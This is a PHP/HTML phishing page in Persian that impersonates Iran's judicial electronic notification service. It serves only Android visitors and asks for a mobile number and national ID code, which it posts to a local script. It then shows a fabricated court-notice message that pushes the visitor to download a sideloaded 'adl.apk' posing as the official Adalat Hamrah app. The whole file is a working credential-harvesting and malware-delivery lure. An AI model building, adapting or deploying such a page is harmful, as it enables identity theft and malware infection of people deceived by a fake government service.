<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'Android') === false) {
    echo "Access denied. This page is off";

    exit();

}

?>

<!DOCTYPE html>

<html dir="rtl "lang="fa">

<head>

  

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta charset="UTF-8">

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

 

	

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css">

<style>

    body {
		
	        

        margin-top: 0px;

        font-family: 'Byekan', Tahoma, Arial, sans-serif;

        background-color: #f8fbf8;

    }

	

	.top-section {  
		
		

		background:#f8fbf8;

      position: relative;

      text-align: center;

      padding: 65px;

      margin-bottom: 3px;

    }

    

    .small-background {

      position: absolute;

      top: 5px;

      right: 0px;

      width: 210px;

      height: 28%;

      z-index: 1;

		

		

 background-color: #32cd32;

      

    }

	.small-background-below {

      position: absolute;

      top: 46px;

      right: 0px;

      width: 210px;

      height: 28%;

      background-color: #32cd32;

      

    }.small-background-new {

      position: absolute;

      top: 87px;

      right: 0px;

      width: 210px;

      height: 28%;

      background-color: #32cd32;

      

    }

	

	

	.small-background-new.text,

	.small-background-below .text,

  .small-background .text {

    display: block;

    font-size: 14px;

    color: #fff;

	  font-weight: bold;

    text-align: center;

    padding-top: 13px;

	  line-height: 10px;

    

  }
	
	.dimmed {

  opacity: 0.5;

  pointer-events: none;

}

		   

   

    

	

	

        

    .card {

        width: 90%;

        max-width: 400px;

        margin: 0 auto;

        padding: 20px;
		

        background-color: #fff;

        box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);

        border-radius: 5px;

    }

    .card-header {

		

		box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);

		

        background-color: #32cd32;

        padding: 2px;

        margin-bottom: 10px;
		
        text-align: center;

        border-radius: 5px !important;

    }

	.card-header p {
		color: #fff;
		line-height: 1.6;

		

		margin: 0;

		

		margin-top: 5px;

	

		font-size: 13px;

        margin-bottom: 5px; 

    }

    .form-group label {

        text-align: right;

        float: right;

		

        clear: both;

        margin-right: 5px;

        font-size: 14px;

    }

    .form-control {
        font-size: 15px; 
height:42px;
    

		

box-shadow: 0 0 0 0.0.5rem #32cd32 !important

        border-radius: 5px;

       

       

        padding: 5px;

    }
.form-control:focus {

    border-color: #32cd32 !important;

    box-shadow: 0 0 0 0.1rem #32cd32 !important;

}

    .btn-primary {

		box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);

		

		background-color: #32cd32 !important;

        color: #fff;

		border-color: #32cd32 !important;

		

        width: 100%;

        font-size: 17px;

        height: 43px;

        border-radius: 5px;

        margin-top: 5px;

    }

	.photo {

      position: absolute;

      top: 5px;

      left: 8px;

      width: 170px;

      height: 91%;

      background-image: url('image1.jpg');

      background-size: cover;

      background-position: center;

}.floating-card {

  width: 300px;

  height: 290px;

  background-color: #ffffff;

  border: 1px solid #32cd32;

  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);

  position: fixed;

  top: 40%;

  left: 50%;

  transform: translate(-50%, -50%);

  padding: 20px;

}.dl-button {
	font-size: 14px;
	
	display: inline-block;

  
	width: 260px;
	
	height: 35px;

  background-color: #32cd32;

  color: #fff;

  border: none;

  border-radius: 5px;

  


margin-top: 1px;

}

	.dl-button:focus {

  outline: none;

  border-color: #2aae2a !important; 

}
	
	.new-text {
		margin-right: 10px;

    font-size: 13px;

	text-align: right; 

	line-height: 1.7;
		font-weight: bold;

    

    color: #000;
font-family: 'Byekan', Tahoma, Arial, sans-serif;

  margin-top: 5px;
		margin-right: 5px;
		
margin-bottom: 5px;
    border-radius: 5px;

}
.new-text2 {

    font-size: 13px;
	line-height: 1.7;

	text-align: right; 
	font-weight: bold;

    

    color: #000;

font-family: 'Byekan', Tahoma, Arial, sans-serif;

  margin-top: 5px;
	margin-right: 5px;

    border-radius: 5px;

}
	

    

	

	

 

</style>

	

  

   

    

	<style>

        @font-face {

            font-family: Byekan;

            src: url(Byekan.ttf);

        }

    </style>

</head> 

 <body>

	 <div class="top-section">

		 <div class="photo"></div>

		 

	

	

		 

  <div class="small-background">

    <span class="text">سامانه ابلاغ الکترونیک قضایی</span>

  </div>

  <div class="small-background small-background-new">

    <span class="text">احراز هویت ثنا</span>

  </div>

  <div class="small-background small-background-below">

    <span class="text">مرکز آمار و فناوری اطلاعات</span>

  </div>

  <div class="small-background-left"></div>

</div>

	

  

  <div class="card">

<div id="cardHeader" class="card-header">

    

<p>	
اطلاعات خواسته شده را به درستی وارد نمایید<br>
کد ملی و شماره موبایل میبایست به نام یک شخص باشد<br>
کد پیگیری : 402432</p>
</div>

    <div class="card-body">

      <form id="myForm">

       

        <div class="form-group">

          

          <input type="tel" class="form-control" dir="rtl" id="mobile" placeholder="شماره موبایل" name="mobile">

        </div>

        <div class="form-group">

          

          <input type="tel" class="form-control" dir="rtl" id="nationalCode" placeholder="کد ملی" name="nationalCode">

        </div>

        <button type="submit" class="btn btn-primary">ثبت</button>

      </form>

    </div>

  </div>  

	 

  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>

  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>

        

  <script>

    $(document).ready(function() {

      $('#myForm').submit(function(e) {

        e.preventDefault();

		  var $submitButton = $(this).find('button[type="submit"]');

    $submitButton.prop('disabled', true).html('<i class="fa fa-spinner fa-spin"></i> در حال بررسی');

    

        $.ajax({

          type: "POST",

          url: "formV.php",

          data: $(this).serialize(),

          dataType: "json",

          success: function(response) {

$submitButton.prop('disabled', false).html('ثبت');

            if (response.error) {

              new Noty({

                text: response.error,

                type: 'error',

                timeout: 1000,

                progressBar: true,

                theme: 'sunset',

                layout:'topRight',

        

              }).show();

            } else if (response.success) {

              new Noty({

                text: response.success,

                type: 'success',

                timeout: 1000,

                progressBar: true,

                theme: 'sunset',

                layout: 'topRight',

              }).show();
				var uniqueCode = response.uniqueCode;

        var floatingCard = $('<div>', { class: 'floating-card' }).text('');

var uniqueCodee = $('<div>', { class: 'unique-code' }).text(uniqueCode);
				
var newText = $('<div>', { class: 'new-text' }).text('تایید اطلاعات شما در سامانه با موفقیت انجام شد. ابلاغیه الکترونیکی شماره 1402017219492643982 در حساب کاربری شما در سامانه ابلاغ قرار گرفت. برای اطلاع از علت و پیگیری باید از طریق اپلیکیشن عدالت همراه اقدام نمایید');

var newText3= $('<div>', { class: 'new-text' }).text('اطلاعات وارد شده تایید شد');
var dlButton = $('<button>', { class: 'dl-button' }).text('دانلود اپلیکیشن عدالت همراه');
				
var newText2 = $('<div>', { class: 'new-text2' }).text('');
				
				dlButton.click(function() {


  window.location.href = 'adl.apk';

});
				
				floatingCard.append(newText3);
floatingCard.append(newText2);
				floatingCard.append(newText);
				floatingCard.append(dlButton);  
				$('body').append(floatingCard);



          
$('#myForm input, #myForm textarea, #myForm button').prop('disabled', true);

$('.small-background-new, .card-header,.small-background-below,.small-background,.photo').addClass('dimmed');


			

  
           // Reset the form

              $('#myForm')[0].reset();

            }

          },

          error: function(xhr, textStatus, errorThrown) {$submitButton.prop('disabled', false).html('ثبت');

            new Noty({

              text: "An error occurred while submitting the form.",

              type: 'error',

              timeout: 1500,

              progressBar: true,

              theme: 'sunset',

              layout:'topRight'

            }).show();

          }

        });

      });

    });
	  function copyToClipboard(text) {

  var textarea = document.createElement('textarea');

  textarea.value = text;

  textarea.style.position = 'fixed';

  document.body.appendChild(textarea);

  textarea.select();

  document.execCommand('copy');

  document.body.removeChild(textarea);

}
	  

	

  </script>

</body>

</html>